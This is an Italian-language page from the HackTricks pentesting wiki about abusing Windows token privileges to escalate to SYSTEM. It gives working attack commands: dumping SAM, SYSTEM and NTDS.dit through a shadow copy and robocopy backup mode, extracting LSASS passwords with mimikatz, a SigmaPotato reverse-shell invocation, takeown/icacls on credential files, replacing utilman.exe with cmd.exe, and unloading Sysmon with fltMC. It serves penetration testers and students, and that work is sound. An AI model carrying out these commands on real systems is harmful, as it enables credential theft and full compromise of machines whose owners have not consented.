# Abuso dei token

{{#include ../../banners/hacktricks-training.md}}

## Token

Se **non sai cosa sono i Windows Access Tokens**, leggi questa pagina prima di continuare:


{{#ref}}
access-tokens.md
{{#endref}}

**Potresti riuscire a fare privilege escalation abusando dei token che già possiedi.**

### SeImpersonatePrivilege

Questo privilegio consente a un processo di impersonare (ma non di creare) un token quando riesce a ottenere un handle a quel token. Un token privilegiato può essere acquisito da un Windows service (DCOM) inducendolo a eseguire l'autenticazione NTLM verso un exploit, consentendo successivamente l'esecuzione di un processo con privilegi SYSTEM.<sup>[[2]](#references)</sup> Questo primitive può essere sfruttato usando tool come [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (che richiede che WinRM sia disabilitato), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Note moderne per gli operatori:

- **JuicyPotato è legacy**: su Windows 10 1809+/Server 2019+, preferisci **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, a seconda della superficie RPC/COM ancora raggiungibile.
- Se hai compromesso un service in esecuzione come **`LOCAL SERVICE`** o **`NETWORK SERVICE`** e `whoami /priv` mostra un **filtered token** senza `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera prima il **default privilege set** dell'account (ad esempio con **FullPowers**) e poi riprova con la famiglia potato.<sup>[[3]](#references)</sup>
- Alcuni fork più recenti sono più pratici per gli operatori rispetto ai tool originali. Ad esempio, **SigmaPotato** aggiunge l'esecuzione tramite reflection/in-memory e la compatibilità con le versioni moderne di Windows, mentre **PrintNotifyPotato** abusa del servizio COM PrintNotify ed è spesso utile quando il percorso classico dello Spooler è disabilitato.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

È molto simile a **SeImpersonatePrivilege** e utilizza lo **stesso metodo** per ottenere un token con privilegi.\
Questo privilegio consente quindi di **assegnare un primary token** a un nuovo processo o a un processo sospeso. Con il token di impersonation privilegiato è possibile derivare un primary token (DuplicateTokenEx).\
Con il token è possibile creare un **nuovo processo** con 'CreateProcessAsUser' oppure creare un processo sospeso e **impostare il token** (in generale, non è possibile modificare il primary token di un processo in esecuzione).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se questo token è abilitato, è possibile utilizzare **KERB_S4U_LOGON** per ottenere un **impersonation token** per qualsiasi altro utente senza conoscerne le credenziali, **aggiungere un gruppo arbitrario** (admins) al token, impostare il **livello di integrità** del token su "**medium**" e assegnare questo token al **thread corrente** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Questo privilegio fa sì che il sistema **conceda l'accesso completo in lettura** a qualsiasi file (limitato alle operazioni di lettura). Viene utilizzato per **leggere gli hash delle password degli account Administrator locali** dal registry; in seguito, strumenti come "**psexec**" o "**wmiexec**" possono essere utilizzati con l'hash (tecnica Pass-the-Hash). Tuttavia, questa tecnica non funziona in due condizioni: quando l'account Local Administrator è disabilitato oppure quando è presente una policy che rimuove i diritti amministrativi dagli account Local Administrators che effettuano connessioni remote.<sup>[[2]](#references)</sup>\
In pratica, il workflow built-in più affidabile è solitamente **VSS + `robocopy /b`**: creare/esporre una shadow copy, quindi copiare `SAM`/`SYSTEM` o `NTDS.dit` in **backup mode**, bypassando le ACL dei file.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Puoi **abusare di questo privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguendo **IppSec** su [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Oppure come spiegato nella sezione **escalating privileges with Backup Operators** di:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Questo privilegio fornisce l'autorizzazione per l'**accesso in scrittura** a qualsiasi file di sistema, indipendentemente dalla relativa Access Control List (ACL). Offre numerose possibilità di escalation, tra cui la possibilità di **modificare i servizi**, eseguire DLL Hijacking e impostare **debugger** tramite Image File Execution Options, oltre a diverse altre tecniche.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege è un'autorizzazione potente, particolarmente utile quando un utente possiede la capacità di impersonare token, ma anche in assenza di SeImpersonatePrivilege. Questa capacità dipende dalla possibilità di impersonare un token che rappresenta lo stesso utente e il cui integrity level non supera quello del processo corrente.<sup>[[2]](#references)</sup>

**Punti chiave:**

- **Impersonation senza SeImpersonatePrivilege:** è possibile sfruttare SeCreateTokenPrivilege per l'EoP impersonando token in condizioni specifiche.
- **Condizioni per la token impersonation:** per un'impersonation riuscita, il token di destinazione deve appartenere allo stesso utente e avere un integrity level inferiore o uguale a quello del processo che tenta l'impersonation.
- **Creazione e modifica degli impersonation token:** gli utenti possono creare un impersonation token e potenziarlo aggiungendo il SID (Security Identifier) di un gruppo privilegiato.

### SeLoadDriverPrivilege

Questo privilegio consente a un processo di **caricare e scaricare device driver** creando una voce di registro con valori `ImagePath` e `Type` specifici. Poiché l'accesso diretto in scrittura a `HKLM` (HKEY_LOCAL_MACHINE) è limitato, è possibile utilizzare `HKCU` (HKEY_CURRENT_USER). Tuttavia, è necessario un percorso specifico affinché la voce in `HKCU` venga riconosciuta dal kernel come una configurazione del driver.<sup>[[2]](#references)</sup>

L'uso offensivo moderno consiste generalmente nel **BYOVD** (bring your own vulnerable driver): caricare un **signed but vulnerable** kernel driver e utilizzare quindi i relativi IOCTL per disabilitare le protezioni o ottenere l'esecuzione di codice nel kernel. Tieni presente che nelle build recenti di Windows 11/Server la **Microsoft vulnerable driver blocklist** e/o **HVCI/Memory Integrity** spesso rendono inutilizzabili le vecchie chain pubbliche, quindi i classici esempi in stile `szkg64.sys` non sono più universalmente affidabili.

Questo percorso è `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` è il Relative Identifier dell'utente corrente. In `HKCU`, è necessario creare l'intero percorso e impostare due valori:<sup>[[2]](#references)</sup>

- `ImagePath`, ovvero il percorso del binary da eseguire
- `Type`, con valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Passaggi da seguire:**

1. Accedi a `HKCU` invece di `HKLM` a causa dell'accesso in scrittura limitato.
2. Crea il percorso `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` all'interno di `HKCU`, dove `<RID>` rappresenta il Relative Identifier dell'utente corrente.
3. Imposta `ImagePath` sul percorso di esecuzione del binary.
4. Imposta `Type` su `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Altri modi per abusare di questo privilegio sono descritti in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

È simile a **SeRestorePrivilege**. La sua funzione principale consente a un processo di **assumere la proprietà di un oggetto**, aggirando il requisito di accesso discrezionale esplicito tramite la concessione dei diritti di accesso WRITE_OWNER. Il processo consiste innanzitutto nell'assumere la proprietà della chiave del registro interessata ai fini della scrittura, quindi nel modificare la DACL per consentire le operazioni di scrittura.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Questo privilegio consente di **eseguire il debug di altri processi**, incluso leggere e scrivere nella memoria. Con questo privilegio è possibile impiegare diverse strategie di memory injection, in grado di eludere la maggior parte delle soluzioni antivirus e di host intrusion prevention.<sup>[[2]](#references)</sup>

Nelle versioni moderne di Windows, ricorda che `SeDebugPrivilege` è solitamente sufficiente per aprire **processi SYSTEM non protetti** e duplicarne i token, ma **non garantisce** di poter interagire con **LSASS**. Se **RunAsPPL / LSA Protection** è abilitato, i processi non protetti non possono leggere o eseguire injection in LSASS, anche se `SeDebugPrivilege` è presente. In tal caso, ruba un token da un altro processo SYSTEM non PPL, oppure concatena un PPL bypass/BYOVD invece di presumere che `procdump` funzionerà. Per un esempio completo di copia del token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulta [questa pagina](sedebug-+-seimpersonate-copy-token.md).

#### Eseguire il dump della memoria

Puoi usare [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) dalla [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) per **acquisire la memoria di un processo**. In particolare, questo può essere applicato al processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsabile della memorizzazione delle credenziali degli utenti dopo che questi hanno effettuato correttamente l'accesso a un sistema.

Puoi quindi caricare questo dump in mimikatz per ottenere le password:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se vuoi ottenere una shell `NT SYSTEM` puoi usare:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Questo diritto (Perform volume maintenance tasks) consente di aprire handle ai dispositivi dei volumi raw (ad es., \\.\C:) per eseguire operazioni di I/O dirette sul disco che bypassano gli ACL NTFS. Con questo diritto è possibile copiare i byte di qualsiasi file sul volume leggendo i blocchi sottostanti, consentendo la lettura arbitraria di file contenenti materiale sensibile (ad es., chiavi private della macchina in %ProgramData%\Microsoft\Crypto\, hive del registro, SAM/NTDS tramite VSS).<sup>[[5]](#references)</sup> È particolarmente impattante sui server CA, dove l'esfiltrazione della chiave privata della CA consente di forgiare un Golden Certificate per impersonare qualsiasi principal.<sup>[[6]](#references)</sup>

Vedi le tecniche dettagliate e le mitigazioni:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
I **token che vengono visualizzati come Disabled** possono generalmente essere abilitati, quindi spesso è possibile abusare sia dei privilegi _Enabled_ che di quelli _Disabled_.

### Abilitare tutti i token

Se disponi di privilegi disabilitati, puoi usare lo script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) per abilitare tutti i token:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Oppure lo **script** incorporato in questo [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabella

Cheatsheet completa sui privilegi dei token disponibile su [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); il riepilogo seguente elenca solo i metodi diretti per sfruttare il privilegio e ottenere una sessione admin o leggere file sensibili.<sup>[[1]](#references)</sup>

| Privilegio                 | Impatto     | Strumento                | Percorso di esecuzione                                                                                                                                                                                                                                                                                                                             | Note                                                                                                                                                                                                                                                                                                                          |
| -------------------------- | ----------- | ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | strumento di terze parti | _"Consentirebbe a un utente di impersonare token e fare privesc a nt system usando strumenti come potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                                    | Grazie ad [Aurélien Chalot](https://twitter.com/Defte_) per l'aggiornamento. Presto proverò a riformularlo in una forma più simile a una ricetta.                                                                                                                                                                             |
| **`SeBackup`**             | **Minaccia** | _**comandi integrati**_ | Leggere file sensibili con `robocopy /b` o helper di copia dedicati che supportano SeBackup.                                                                                                                                                                                                                                                       | <p>- Ottimo per `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e talvolta `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` è comodo, ma i cmdlet/API SeBackup dedicati sono spesso più flessibili per i file bloccati/aperti.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | strumento di terze parti | Creare un token arbitrario, inclusi i diritti di admin locale, con `NtCreateToken`.                                                                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**           | Duplicare un token SYSTEM **non-PPL** o eseguire il dump della memoria di un processo non protetto.                                                                                                                                                                                                                                                 | <p>Il dumping di LSASS viene comunemente bloccato se RunAsPPL/LSA Protection è abilitato.</p><p>Lo script è disponibile su [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | strumento di terze parti | Usare la **famiglia Potato** / l'impersonation tramite named pipe per avviare SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ecc.).                                                                                                                                                                      | <p>È più pratico dagli account di servizio come IIS APPPOOL, MSSQL, scheduled task o qualsiasi contesto che possieda già `SeImpersonatePrivilege`.</p>                                                                                                                                                                         |
| **`SeLoadDriver`**         | _**Admin**_ | strumento di terze parti | <p>1. Caricare un kernel driver firmato ma vulnerabile (BYOVD)<br>2. Usare gli IOCTL del driver per ottenere R/W sul kernel, disabilitare gli strumenti di sicurezza o elevarsi a SYSTEM<br><br>In alternativa, il privilegio può essere usato per scaricare driver legati alla sicurezza con il comando integrato <code>fltMC</code>, ad esempio <code>fltMC sysmondrv</code></p> | <p>I driver pubblici più vecchi, come <code>szkg64.sys</code>, vengono sempre più spesso bloccati nelle versioni moderne di Windows dalla vulnerable-driver blocklist / HVCI.</p>                                                                                                                                           |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**           | <p>1. Avviare PowerShell/ISE con il privilegio SeRestore presente.<br>2. Abilitare il privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rinominare utilman.exe in utilman.old<br>4. Rinominare cmd.exe in utilman.exe<br>5. Bloccare la console e premere Win+U</p> | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei service binary archiviati in "Program Files" usando lo stesso privilegio</p>                                                                                                                                  |
| **`SeTakeOwnership`**      | _**Admin**_ | _**comandi integrati**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rinominare cmd.exe in utilman.exe<br>4. Bloccare la console e premere Win+U</p>                                                                                                                                        | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei service binary archiviati in "Program Files" usando lo stesso privilegio.</p>                                                                                                                                   |
| **`SeTcb`**                | _**Admin**_ | strumento di terze parti | <p>Manipolare i token per includere i diritti di admin locale. Potrebbe richiedere SeImpersonate.</p><p>Da verificare.</p>                                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - percorsi di sfruttamento dai privilegi Windows ad admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abuso dei privilegi dei token per LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Ridatemi i miei privilegi! Per favore?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (la modalità di backup `/b` bypassa i controlli ACL di file/cartelle)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Eseguire attività di manutenzione dei volumi (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → esfiltrazione della chiave CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
